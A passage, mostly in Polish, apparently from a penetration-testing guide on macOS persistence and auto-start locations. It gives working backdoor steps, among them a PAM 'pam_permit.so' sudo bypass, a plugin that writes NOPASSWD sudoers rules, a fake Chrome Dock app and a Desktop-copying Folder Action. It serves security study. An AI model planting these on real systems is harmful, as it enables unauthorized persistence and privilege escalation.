To utworzy plik za 1 godzinę:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Sprawdź kolejkę zadań za pomocą `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Powyżej widać dwa zaplanowane zadania. Szczegóły zadania można wypisać poleceniem `at -c JOBNUMBER`.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Jeśli zadania AT nie są włączone, utworzone zadania nie zostaną wykonane.

Pliki **job** można znaleźć w `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Nazwa pliku zawiera kolejkę, numer zadania i czas, kiedy jest zaplanowane do uruchomienia. Na przykład przyjrzyjmy się `a0001a019bdcd2`.

- `a` - to jest kolejka
- `0001a` - numer zadania w hex, `0x1a = 26`
- `019bdcd2` - czas w hex. Reprezentuje minuty, które upłynęły od epoch. `0x019bdcd2` to `26991826` w systemie dziesiętnym. Jeśli pomnożymy to przez 60, otrzymamy `1619509560`, co odpowiada `GMT: 2021. April 27., Tuesday 7:46:00`.

Jeśli wypiszemy plik zadania, znajdziemy w nim te same informacje, które uzyskaliśmy używając `at -c`.

### Akcje folderu

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Ale musisz być w stanie wywołać `osascript` z argumentami, aby skontaktować się z **`System Events`** i móc skonfigurować akcje folderu
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Posiada podstawowe uprawnienia TCC takie jak Desktop, Documents i Downloads

#### Lokalizacja

- **`/Library/Scripts/Folder Action Scripts`**
- Wymagane uprawnienia root
- **Trigger**: Dostęp do określonego folderu
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Dostęp do określonego folderu

#### Opis i wykorzystanie

Folder Actions to skrypty automatycznie wywoływane przez zmiany w folderze, takie jak dodanie, usunięcie elementów, lub inne akcje jak otwieranie czy zmiana rozmiaru okna folderu. Te akcje mogą być użyte do różnych zadań i mogą być uruchamiane na różne sposoby, np. za pomocą interfejsu Finder lub poleceń w terminalu.

Aby skonfigurować akcje folderu, masz opcje takie jak:

1. Stworzenie workflow akcji folderu za pomocą [Automator](https://support.apple.com/guide/automator/welcome/mac) i zainstalowanie go jako usługi.
2. Ręczne dołączenie skryptu przez Folder Actions Setup w menu kontekstowym folderu.
3. Użycie OSAScript do wysyłania Apple Eventów do `System Events.app` w celu programowego ustawienia akcji folderu.
- Ta metoda jest szczególnie przydatna do osadzenia akcji w systemie, oferując pewien poziom persistence.

Poniższy skrypt jest przykładem tego, co może być wykonane przez akcję folderu:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Aby użyć powyższego skryptu w Folder Actions, skompiluj go za pomocą:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Po skompilowaniu skryptu skonfiguruj Folder Actions, uruchamiając poniższy skrypt. Skrypt włączy Folder Actions globalnie i przypisze wcześniej skompilowany skrypt do folderu Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Uruchom skrypt konfiguracji za pomocą:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Oto sposób implementacji persistence przez GUI:

Oto skrypt, który zostanie wykonany:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Skompiluj to poleceniem: `osacompile -l JavaScript -o folder.scpt source.js`

Przenieś go do:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Następnie otwórz aplikację `Folder Actions Setup`, wybierz **folder, który chcesz obserwować** i wybierz w Twoim przypadku **`folder.scpt`** (u mnie nazwałem go output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Teraz, jeśli otworzysz ten folder za pomocą **Finder**, twój skrypt zostanie wykonany.

Ta konfiguracja została zapisana w **plist** znajdującym się w **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** w formacie base64.

Teraz spróbujmy przygotować tę persistence bez dostępu do GUI:

1. **Skopiuj `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** do `/tmp`, aby zrobić kopię zapasową:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Usuń** Folder Actions, które właśnie ustawiłeś:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Teraz, gdy mamy puste środowisko

3. Skopiuj plik kopii zapasowej: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Otwórz Folder Actions Setup.app, aby zastosować tę konfigurację: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> I to nie zadziałało u mnie, ale to są instrukcje z writeupu:(

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Przydatne do obejścia sandboxu: [✅](https://emojipedia.org/check-mark-button)
- Ale musisz mieć zainstalowaną złośliwą aplikację w systemie
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Gdy użytkownik kliknie aplikację w Docku

#### Description & Exploitation

Wszystkie aplikacje pojawiające się w Docku są określone w plist: **`~/Library/Preferences/com.apple.dock.plist`**

Możliwe jest **dodanie aplikacji** po prostu za pomocą:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Korzystając z **social engineering** możesz **podszyć się na przykład pod Google Chrome** w docku i faktycznie uruchomić własny skrypt:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Wybieracze kolorów

Opis: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Przydatne do ominięcia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Wymagana jest bardzo konkretna akcja
- Zakończysz w innym sandboxie
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `/Library/ColorPickers`
- Wymagane uprawnienia root
- Wyzwalacz: Użycie wybieracza kolorów
- `~/Library/ColorPickers`
- Wyzwalacz: Użycie wybieracza kolorów

#### Opis & Exploit

**Skompiluj color picker** bundle ze swoim kodem (możesz użyć [**this one for example**](https://github.com/viktorstrate/color-picker-plus)) i dodaj konstruktor (jak w [Screen Saver section](macos-auto-start-locations.md#screen-saver)) i skopiuj bundle do `~/Library/ColorPickers`.

Wtedy, gdy color picker zostanie wywołany, twój kod również zostanie uruchomiony.

Zauważ, że binarka ładująca twoją bibliotekę ma **bardzo restrykcyjny sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Opis**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Opis**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Przydatne do obejścia sandbox: **Nie, ponieważ musisz uruchomić własną aplikację**
- TCC bypass: ???

#### Lokalizacja

- Konkretna aplikacja

#### Opis & Exploit

Przykład aplikacji z Finder Sync Extension [**można znaleźć tutaj**](https://github.com/D00MFist/InSync).

Aplikacje mogą mieć `Finder Sync Extensions`. To rozszerzenie będzie umieszczone wewnątrz aplikacji, która zostanie uruchomiona. Co więcej, aby rozszerzenie mogło wykonać swój kod, **musi być podpisane** ważnym certyfikatem dewelopera Apple, musi być **sandboxed** (chociaż można dodać złagodzone wyjątki) i musi być zarejestrowane z czymś w rodzaju:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Wygaszacz ekranu

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Jednak skończysz w zwykłej piaskownicy aplikacji
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `/System/Library/Screen Savers`
- Wymaga uprawnień root
- **Wyzwalacz**: Wybierz wygaszacz ekranu
- `/Library/Screen Savers`
- Wymaga uprawnień root
- **Wyzwalacz**: Wybierz wygaszacz ekranu
- `~/Library/Screen Savers`
- **Wyzwalacz**: Wybierz wygaszacz ekranu

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Opis i Exploit

Utwórz nowy projekt w Xcode i wybierz szablon tworzący nowy **Screen Saver**. Następnie dodaj do niego swój kod — na przykład poniższy kod generujący logi.

Skompiluj go i skopiuj pakiet `.saver` do **`~/Library/Screen Savers`**. Następnie otwórz GUI wygaszacza ekranu i jeśli po prostu klikniesz na niego, powinien wygenerować dużo logów:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Zauważ, że ponieważ w entitlements binarki, która ładuje ten kod (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) znajduje się **`com.apple.security.app-sandbox`**, będziesz **inside the common application sandbox**.
  
Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Wtyczki Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- But you will end in an application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- The sandbox looks very limited

#### Lokalizacja

- `~/Library/Spotlight/`
- **Wyzwalacz**: Utworzono nowy plik z rozszerzeniem obsługiwanym przez spotlight plugin.
- `/Library/Spotlight/`
- **Wyzwalacz**: Utworzono nowy plik z rozszerzeniem obsługiwanym przez spotlight plugin.
- Wymagane uprawnienia roota
- `/System/Library/Spotlight/`
- **Wyzwalacz**: Utworzono nowy plik z rozszerzeniem obsługiwanym przez spotlight plugin.
- Wymagane uprawnienia roota
- `Some.app/Contents/Library/Spotlight/`
- **Wyzwalacz**: Utworzono nowy plik z rozszerzeniem obsługiwanym przez spotlight plugin.
- Wymagana nowa aplikacja

#### Opis i eksploatacja

Spotlight to wbudowana funkcja wyszukiwania w macOS, zaprojektowana, by zapewnić użytkownikom **szybki i kompleksowy dostęp do danych na ich komputerach**.  
Aby umożliwić takie szybkie wyszukiwanie, Spotlight utrzymuje **własną bazę danych** i tworzy indeks poprzez **parsowanie większości plików**, co pozwala na szybkie wyszukiwanie zarówno po nazwach plików, jak i po ich zawartości.

Podstawowy mechanizm Spotlight obejmuje centralny proces o nazwie 'mds', który oznacza **'serwer metadanych'**. Proces ten orkiestruje cały serwis Spotlight. Uzupełniają go liczne demony 'mdworker', które wykonują różne zadania konserwacyjne, takie jak indeksowanie różnych typów plików (`ps -ef | grep mdworker`). Zadania te są możliwe dzięki importerom Spotlight, czyli **".mdimporter bundles"**, które umożliwiają Spotlight zrozumienie i indeksowanie treści w różnorodnych formatach plików.

Wtyczki, czyli pakiety **`.mdimporter`**, znajdują się w wcześniej wymienionych lokalizacjach, a jeśli pojawi się nowy bundle, zostanie załadowany w ciągu minuty (nie ma potrzeby restartu żadnej usługi). Pakiety te muszą wskazać, jakie **typy plików i rozszerzenia potrafią obsługiwać**, dzięki czemu Spotlight użyje ich, gdy zostanie utworzony nowy plik z danym rozszerzeniem.

Możliwe jest **znalezienie wszystkich załadowanych i uruchomionych `mdimporters`**:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Na przykład **/Library/Spotlight/iBooksAuthor.mdimporter** jest używany do parsowania tego typu plików (rozszerzenia `.iba` i `.book` między innymi):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Jeśli sprawdzisz Plist innych `mdimporter` możesz nie znaleźć wpisu **`UTTypeConformsTo`**. To dlatego, że jest to wbudowany _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) i nie musi określać rozszerzeń.
>
> Co więcej, domyślne w systemie pluginy zawsze mają pierwszeństwo, więc atakujący może uzyskać dostęp tylko do plików, które nie są indeksowane przez własne `mdimporters` Apple'a.

Aby stworzyć własny importer możesz zacząć od tego projektu: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), a następnie zmienić nazwę, **`CFBundleDocumentTypes`** i dodać **`UTImportedTypeDeclarations`**, aby obsługiwał rozszerzenie, które chcesz wspierać, oraz odzwierciedlić je w **`schema.xml`**.\
Następnie **zmień** kod funkcji **`GetMetadataForFile`**, aby wykonać swój payload, kiedy zostanie utworzony plik z przetwarzanym rozszerzeniem.

Na koniec **zbuduj i skopiuj swój nowy `.mdimporter`** do jednej z poprzednich lokalizacji i możesz sprawdzać, czy został załadowany, **monitorując logi** lub sprawdzając **`mdimport -L.`**

### ~~Preference Pane~~

> [!CAUTION]
> Wygląda na to, że to już nie działa.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Przydatne do obejścia sandboxu: [🟠](https://emojipedia.org/large-orange-circle)
- Wymaga specyficznej akcji użytkownika
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Wygląda na to, że to już nie działa.

## Root Sandbox Bypass

> [!TIP]
> Tutaj możesz znaleźć lokacje startowe przydatne do **sandbox bypass**, które pozwalają po prostu coś wykonać przez **zapisanie tego do pliku** będąc **root** i/lub wymagając innych **dziwnych warunków.**

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Przydatne do obejścia sandboxu: [🟠](https://emojipedia.org/large-orange-circle)
- Ale musisz być root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Wymagany root
- **Trigger**: Gdy nadejdzie odpowiedni czas
- `/etc/daily.local`, `/etc/weekly.local` lub `/etc/monthly.local`
- Wymagany root
- **Trigger**: Gdy nadejdzie odpowiedni czas

#### Description & Exploitation

Skrypty periodiczne (**`/etc/periodic`**) są uruchamiane z powodu **launch daemons** skonfigurowanych w `/System/Library/LaunchDaemons/com.apple.periodic*`. Zauważ, że skrypty przechowywane w `/etc/periodic/` są **wykonywane** jako **właściciel pliku**, więc to nie zadziała jako potencjalna eskalacja uprawnień.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Istnieją inne skrypty okresowe, które będą wykonywane, wskazane w **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Jeśli uda Ci się zapisać którykolwiek z plików `/etc/daily.local`, `/etc/weekly.local` lub `/etc/monthly.local`, zostanie on **wykonany prędzej czy później**.

> [!WARNING]
> Zwróć uwagę, że skrypt uruchamiany okresowo będzie **wykonywany jako jego właściciel**. Jeśli zwykły użytkownik jest właścicielem skryptu, zostanie on wykonany jako ten użytkownik (może to uniemożliwić ataki eskalacji uprawnień).

### PAM

Opis: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Opis: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Jednak wymagane są uprawnienia root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Zawsze wymagane uprawnienia root

#### Opis i Eksploatacja

Ponieważ PAM skupia się bardziej na **persistence** i **malware** niż na łatwym uruchamianiu w macOS, ten blog nie będzie podawać szczegółowego wyjaśnienia; **przeczytaj writeupy, aby lepiej zrozumieć tę technikę**.

Sprawdź moduły PAM za pomocą:
```bash
ls -l /etc/pam.d
```
Technika persistence/privilege escalation wykorzystująca PAM jest tak prosta, jak zmodyfikowanie modułu /etc/pam.d/sudo poprzez dodanie na początku następującej linii:
```bash
auth       sufficient     pam_permit.so
```
Więc będzie to **wyglądać** mniej więcej tak:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
W związku z tym każda próba użycia **`sudo` zadziała**.

> [!CAUTION]
> Zauważ, że ten katalog jest chroniony przez TCC, więc bardzo prawdopodobne, że użytkownik otrzyma monit proszący o dostęp.

Innym dobrym przykładem jest su, gdzie widać, że możliwe jest także przekazywanie parametrów do modułów PAM (i można też backdoor ten plik):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Artykuł: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Artykuł: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ale musisz być root i wykonać dodatkowe konfiguracje
- TCC bypass: ???

#### Lokalizacja

- `/Library/Security/SecurityAgentPlugins/`
- Wymagane uprawnienia root
- Konieczne jest też skonfigurowanie authorization database, żeby używać pluginu

#### Opis & Exploitation

Możesz utworzyć authorization plugin, który zostanie uruchomiony, gdy użytkownik się zaloguje (logs-in) w celu utrzymania persistence. Po więcej informacji o tym, jak stworzyć taki plugin sprawdź wcześniejsze writeupy (i uwaga — źle napisany plugin może zablokować dostęp i będziesz musiał wyczyścić swój mac z recovery mode).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Przenieś** bundle do lokalizacji, z której zostanie załadowany:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Na koniec dodaj **regułę** ładującą ten Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
The **`evaluate-mechanisms`** poinformuje framework autoryzacji, że będzie musiał **wywołać zewnętrzny mechanizm do autoryzacji**. Ponadto, **`privileged`** spowoduje, że będzie uruchomiony przez root.

Wywołaj to za pomocą:
```bash
security authorize com.asdf.asdf
```
A następnie grupa 'staff' powinna mieć dostęp sudo (przeczytaj `/etc/sudoers`, aby to potwierdzić).

### Man.conf

Opis: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Przydatne do bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Jednak musisz być root, a użytkownik musi używać man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/private/etc/man.conf`**
- Wymagane uprawnienia root
- **`/private/etc/man.conf`**: Za każdym razem gdy używany jest man

#### Opis & Exploit

Plik konfiguracyjny **`/private/etc/man.conf`** wskazuje binarkę/skrypt do użycia podczas otwierania plików dokumentacji man. Ścieżka do wykonywalnego pliku może być zmodyfikowana, więc za każdym razem, gdy użytkownik użyje man do czytania dokumentacji, uruchamiany jest backdoor.

Na przykład ustaw w **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Następnie utwórz `/tmp/view` jako:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Opis**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Przydatne do bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ale musisz być root i apache musi być uruchomiony
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd nie ma entitlements

#### Lokalizacja

- **`/etc/apache2/httpd.conf`**
- Wymagane uprawnienia root
- Wyzwalacz: Gdy Apache2 zostanie uruchomiony

#### Opis & Exploit

Możesz w `/etc/apache2/httpd.conf` wskazać załadowanie modułu, dodając linię taką jak:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
W ten sposób twój skompilowany moduł zostanie załadowany przez Apache. Jedyną rzeczą jest to, że albo musisz go **podpisać ważnym certyfikatem Apple**, albo musisz **dodać nowy zaufany certyfikat** w systemie i **podpisać go nim**.

